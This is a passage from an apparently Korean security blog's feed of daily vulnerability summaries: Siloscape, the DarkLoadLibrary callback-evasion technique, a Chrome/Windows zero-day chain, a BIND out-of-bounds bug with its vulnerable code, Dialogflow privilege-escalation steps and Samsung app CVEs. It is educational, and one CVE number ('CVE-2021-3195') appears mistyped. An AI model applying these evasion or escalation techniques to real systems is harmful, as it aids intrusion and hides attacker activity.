Siloscape&#xB294; &#xD558;&#xB098;&#xC758; &#xBAA9;&#xC801;&#xC5D0;&#xB9CC; &#xAD6D;&#xD55C;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xB2E4;&#xC591;&#xD55C; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD55C;&#xB2E4;.</p><p><a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">&#xD544;&#xC790;&#xC758; &#xC9C0;&#xB09C; &#xAC8C;&#xC2DC;&#xAE00;</a>&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD588;&#xB4EF; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xB294; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; Windows container&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xB9D0;&#xB77C;&#xACE0; &#xD588;&#xB2E4;. &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xB294; security boundary&#xB97C; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xD654;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xC9C0; &#xB9D0;&#xACE0; Hyper-V &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC78; &#xCD94;&#xCC9C;&#xD55C;&#xB2E4;. Windows Server container&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xAC83;&#xC73C;&#xB85C; &#xC0DD;&#xAC01;&#xD574;&#xC57C; &#xD558;&#xBA70; &#xC774;&#xBC88; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; Kubernetes node&#xC600;&#xB2E4;. &#xBCF4;&#xC548;&#xC774; &#xD544;&#xC694;&#xD55C; Windows Server container&#xC5D0;&#xC11C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xACBD;&#xC6B0; Hyper-V &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC8C; &#xC88B;&#xB2E4;.</p><p>&#xAC8C;&#xB2E4;&#xAC00; &#xAD00;&#xB9AC;&#xC790;&#xB294; Kubernetes cluster&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. secured Kubernetes node&#xC758; &#xAD8C;&#xD55C;&#xC740; &#xD574;&#xB2F9; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB9CC;&#xD07C;&#xC758; &#xCDA9;&#xBD84;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC5B4;&#xC11C; Siloscape&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><p>Siloscape&#xB294; container escape&#xB97C; &#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xD53C;&#xD574;&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xBCF4;&#xC548;&#xC758; &#xC911;&#xC694;&#xC131;&#xC744; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>cloud</tag>
      
      <tag>containers</tag>
      
      <tag>kubernetes</tag>
      
      <tag>siloscape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Bypassing Image Load Kernel Callbacks</title>
    <link href="/2021/06/20/j0ker/2021-06-20/"/>
    <url>/2021/06/20/j0ker/2021-06-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/">Bypassing Image Load Kernel Callbacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; LoadLibrary &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; DLL &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xBA74; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xB4F1;&#xB85D;&#xD55C; Callback &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xC774;&#xBCA4;&#xD2B8; &#xB85C;&#xADF8;&#xC5D0; &#xD574;&#xB2F9; DLL&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xB0B4;&#xC6A9;&#xAC00; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;. LoadLibrary &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74;, &#xD574;&#xB2F9; &#xC774;&#xBCA4;&#xD2B8;&#xB294; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC774; &#xB9C1;&#xD06C;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC774;&#xB098; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC14B;&#xC5C5;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; NtMapViewOfSection &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; LoadLibrary &#xD568;&#xC218;&#xB97C; &#xB611;&#xAC19;&#xC774; &#xAD6C;&#xD604;&#xD558;&#xB418; NtMapViewOfSection &#xD568;&#xC218;&#xAE4C;&#xC9C0;&#xC758; &#xACFC;&#xC815;&#xB9CC; &#xAD6C;&#xD604;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xACBD;&#xC6B0;, DLL&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xC774;&#xBCA4;&#xD2B8;&#xB9CC; &#xBC1C;&#xC0DD;&#xD560; &#xBFD0;, &#xC2E4;&#xC81C;&#xB85C; DLL&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Dylan&#xC740; &#xCEE4;&#xB110;&#xC758; Callback &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xC774;&#xBCA4;&#xD2B8; &#xB85C;&#xADF8;&#xC758; &#xBC1C;&#xC0DD; &#xC5C6;&#xC774; DLL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xACFC; &#xC774;&#xB97C; &#xAD6C;&#xD604;&#xD55C; <a href="https://github.com/bats3c/DarkLoadLibrary">DarkLoadLibrary &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;</a>&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB3D9;&#xC791; &#xACFC;&#xC815;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC815;&#xC0C1;&#xC801;&#xC778; PE &#xD3EC;&#xB9F7;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;</li><li>&#xD5E4;&#xB354;&#xC640; &#xC139;&#xC158; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xBCF5;&#xC0AC; &#xD6C4; &#xBA54;&#xBAA8;&#xB9AC; &#xAD8C;&#xD55C; &#xC124;&#xC815;</li><li>(&#xD544;&#xC694;&#xD558;&#xB2E4;&#xBA74;) &#xC774;&#xBBF8;&#xC9C0; &#xBCA0;&#xC774;&#xC2A4; &#xC870;&#xC815;</li><li>import table&#xACFC; delayed import table &#xC138;&#xD305;</li><li>TLS callback &#xC2E4;&#xD589;</li><li>exception handler &#xB4F1;&#xB85D;</li><li>DllMain(Entry Point) &#xD638;&#xCD9C;</li></ol><p>Dylan&#xC740; &#xC774; &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xC5B4;&#xB5A4; DLL&#xC744; &#xB85C;&#xB4DC;&#xD588;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xB85C;&#xADF8;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xACE0; &#xC774; &#xAE30;&#xBC95;&#xC774; Reflective DLL Injection&#xC744; &#xB300;&#xCCB4;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>bypass</tag>
      
      <tag>j0ker</tag>
      
      <tag>loadimage</tag>
      
      <tag>event</tag>
      
      <tag>darkloadlibrary</tag>
      
      <tag>callback</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PuzzleMaker: 실제 공격에 사용된 Exploit chain</title>
    <link href="/2021/06/19/fabu1ous/2021-06-19/"/>
    <url>/2021/06/19/fabu1ous/2021-06-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">PuzzleMaker attacks with Chrome zero-day exploit chain</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt;= 90.0.4430.85</p><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xCD5C;&#xADFC; &#xC5EC;&#xB7EC; &#xAE30;&#xC5C5;&#xC5D0; &#xB300;&#xD55C; &#xACE0;&#xB3C4;&#xB85C; &#xD45C;&#xC801;&#xD654;&#xB41C; &#xACF5;&#xACA9;&#xC774; &#xAC10;&#xC9C0;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Kaspersky technologies&#xC758; &#xBD84;&#xC11D;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xD574;&#xB2F9; &#xACF5;&#xACA9;&#xB4E4;&#xC740; &#xAD6C;&#xAE00; Chrome(CVE-2021-21224)&#xACFC; Windows(CVE-2021-31955, CVE-2021-31956) &#xC81C;&#xB85C;&#xB370;&#xC774; Exploit chain&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><p>CVE-2021-21224</p><p>90.0.4430.85&#xC774;&#xC804; Chrome&#xC758; V8&#xC5D0;&#xB294; Type confusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD574; &#xD574;&#xCEE4;&#xB85C; &#xD558;&#xC5EC;&#xAE08; &#xC545;&#xC131; HTML &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-31955</p><p>ntoskrnl.exe&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC815;&#xBCF4; &#xB178;&#xCD9C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Windows OS&#xC758; SuperFetch &#xAE30;&#xB2A5;&#xC744; &#xC545;&#xC6A9;&#xD55C; &#xAC83;&#xC73C;&#xB85C; <code>NtQuerySystemInformation</code>&#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xBC18;&#xD658;&#xB41C; SuperFetch &#xC815;&#xBCF4; &#xD074;&#xB798;&#xC2A4;&#xC5D0; EPROCESS &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-3195</p><p>ntfs.sys&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; heap-based buffer overflow&#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.<code>NTFSQUeryEaUserEaList</code>&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xD655;&#xC7A5; attribute &#xBAA9;&#xB85D;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xACE0; &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC740; output &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xACE0; 32&#xBE44;&#xD2B8; alignment&#xB85C; &#xC815;&#xB82C;&#xD569;&#xB2C8;&#xB2E4;. Output &#xBC84;&#xD37C;&#xC758; &#xD328;&#xB529; &#xAE30;&#xB2A5;&#xC5D0; integer underflow &#xAC80;&#xC0AC;&#xAC00; &#xC5C6;&#xC5B4;&#xC11C; Heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] ISC BIND 서버의 정보 유출 취약점</title>
    <link href="/2021/06/18/l0ch/2021-06-18/"/>
    <url>/2021/06/18/l0ch/2021-06-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-502-an-information-disclosure-bug-in-isc-bind-server">ZDI-21-502: AN INFORMATION DISCLOSURE BUG IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIND 9.11.31, 9.16.15 &#xC774;&#xC804; </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ISC&#xC0AC;&#xC758; DNS &#xC11C;&#xBC84; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC778; BIND&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC815;&#xBCF4; &#xC720;&#xCD9C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>der_match_tag_and_length()</code> &#xD568;&#xC218;&#xB294; &#xD0DC;&#xADF8;&#xB97C; &#xB9E4;&#xCE6D;&#xD558;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD328;&#xD0B7;&#xC5D0;&#xC11C; &#xAE38;&#xC774;&#xC640; &#xAC19;&#xC740; &#xD544;&#xB4DC;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xD568;&#xC218;&#xB85C;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">static</span> int der_match_tag_and_length(<span class="hljs-keyword">const</span> unsigned char *p, size_t len, Der_class xclass,                 Der_type type, int tag, size_t *length_ret,  size_t *size) {     size_t l, ret = <span class="hljs-number">0</span>;     int e;      e = der_match_tag(p, len, xclass, type, tag, &amp;l);     <span class="hljs-keyword">if</span> (e) {         <span class="hljs-keyword">return</span> (e);     }     p += l;     len -= l;     ret += l;     e = der_get_length(p, len, length_ret, &amp;l);  <span class="hljs-comment">// (1) </span>    <span class="hljs-keyword">if</span> (e) {         <span class="hljs-keyword">return</span> (e);     } ...}</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>der_get_length()</code> &#xD568;&#xC218;&#xC758; &#xC778;&#xC790; &#xC911; <code>length_ret</code>&#xC740; &#xD638;&#xCD9C;&#xC790;&#xC5D0;&#xC11C; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC774;&#xB904;&#xC838;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. <code>der_match_tag_and_length()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC18;&#xD658;&#xB41C; &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xAE38;&#xC774; &#xAC12;&#xC740; &#xC774;&#xD6C4; <a href="https://datatracker.ietf.org/doc/html/rfc4178#section-4.2.1">negTokenInit</a>&#xC744; &#xB514;&#xCF54;&#xB529;&#xD558;&#xB294; <code>decode_NegTokenInit()</code> &#xD568;&#xC218; &#xB0B4;&#xC758; &#xC5EC;&#xB7EC; &#xAC80;&#xC0AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; OOB Access&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>information disclosure</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] dialogflow.cloud.google.com 권한 상승 취약점</title>
    <link href="/2021/06/17/idioth/2021-06-17/"/>
    <url>/2021/06/17/idioth/2021-06-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://lalka-test.medium.com/google-vrp-privilege-escalation-on-https-dialogflow-cloud-google-com-599af6c4516d">[Google VRP] Privilege escalation on https://dialogflow.cloud.google.com)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://dialogflow.cloud.google.com/">https://dialogflow.cloud.google.com/</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Cloud Platform&#xC758; Dialogflow &#xCF58;&#xC194; &#xC0AC;&#xC774;&#xD2B8; <a href="https://dialogflow.cloud.google.com&#xC5D0;&#xC11C;">https://dialogflow.cloud.google.com&#xC5D0;&#xC11C;</a> &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD08;&#xB300;&#xB41C; &#xB2E4;&#xB978; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xB0AE;&#xCDB0;&#xB3C4; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><a href="https://dialogflow.cloud.google.com/#/editAgent/{project}/">https://dialogflow.cloud.google.com/#/editAgent/{project}/</a> &#xC124;&#xC815;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xC5EC; &#x201C;Developer&#x201D; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xCD08;&#xB300;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;Developer&#x201D;&#xB97C; &#x201C;Reviewer&#x201D;&#xB85C; &#xAD8C;&#xD55C;&#xC744; &#xB0AE;&#xCDA5;&#xB2C8;&#xB2E4;.</li><li>&#xC124;&#xC815;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5B4; Reviewer&#xB85C; &#xD654;&#xBA74;&#xC5D0;&#xB294; &#xD45C;&#xC2DC;&#xB418;&#xC9C0;&#xB9CC; &#xC0AC;&#xC6A9;&#xC790;&#xB294; Developer &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p><a href="https://console.cloud.google.com/iam-admin/&#xC5D0;&#xC11C;">https://console.cloud.google.com/iam-admin/&#xC5D0;&#xC11C;</a> &#xD655;&#xC778;&#xD558;&#xBA74; &#xCD08;&#xB300;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xCC98;&#xC74C;&#xC5D0; Developer&#xB85C; &#xC124;&#xC815;&#xD55C; &#xD6C4; Reviewer&#xB85C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC774; &#xC218;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xACE0; Developer + Reviewer&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>gcp</tag>
      
      <tag>idioth</tag>
      
      <tag>google</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Samsung mobile 기본 앱 취약점</title>
    <link href="/2021/06/16/fabu1ous/2021-06-16/"/>
    <url>/2021/06/16/fabu1ous/2021-06-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">Two weeks of securing Samsung devices: Part 1</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Samsung mobile &#xAE30;&#xBCF8; &#xC571;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oversecured &#xD300;&#xC774; &#xC0BC;&#xC131; &#xBAA8;&#xBC14;&#xC77C; &#xAE30;&#xAE30;&#xC5D0; &#xAE30;&#xBCF8; &#xC81C;&#xACF5;&#xB418;&#xB294; &#xC571;&#xC5D0;&#xC11C; &#xB2E4;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xD0C0;&#xAC9F; &#xAE30;&#xAE30;&#xC758; &#xC5F0;&#xB77D;&#xCC98;, &#xD1B5;&#xD654;, SMS/MMS&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xD3B8;&#xC9D1;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>CVE-2021-25388</p><p>Knox Core&#xB294; URI &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD574; &#xD574;&#xCEE4;&#xAC00; &#xC784;&#xC758;&#xC758; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD558;&#xAC70;&#xB098; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p></li><li><p>CVE-2021-25356</p><p>Managed Provisioning&#xC740; &#xBAA8;&#xB4E0; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC758; &#xC2B9;&#xC778;&#xC744; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBCF4;&#xC548; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>com.samsung.knox.container.requestId</code>&#xAC12;&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4;&#xC788;&#xB2E4;&#xBA74; &#xC774;&#xB97C; &#xBB34;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xD574;&#xCEE4;&#xB294; &#xC784;&#xC758;&#xC758; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-25391</p><p>Secure Folder&#xB294; Intent redirection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC5B4; &#xD574;&#xCEE4;&#xAC00; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xAC00;&#xB85C;&#xCC4C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-25393</p><p>SecSetting&#xC740; intent&#xC5D0; &#xB300;&#xD55C; &#xBD80;&#xC801;&#xC808;&#xD55C; sanitization &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xCEE4;&#xAC00; system uid &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-25392</p><p>Samsung Dex&#xB294; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xBC31;&#xC5C5; &#xACBD;&#xB85C; &#xC124;&#xC815; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xCEE4;&#xAC00; &#xC774;&#xB97C; &#xBCC0;&#xACBD;&#xD574; &#xD06C;&#xB9AC;&#xD2F0;&#xCEEC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB178;&#xCD9C;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-25397</p><p>TelephonyUI&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; Access control &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xCEE4;&#xB294; TelephonyUI&#xC758; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xD560; &#xC218; 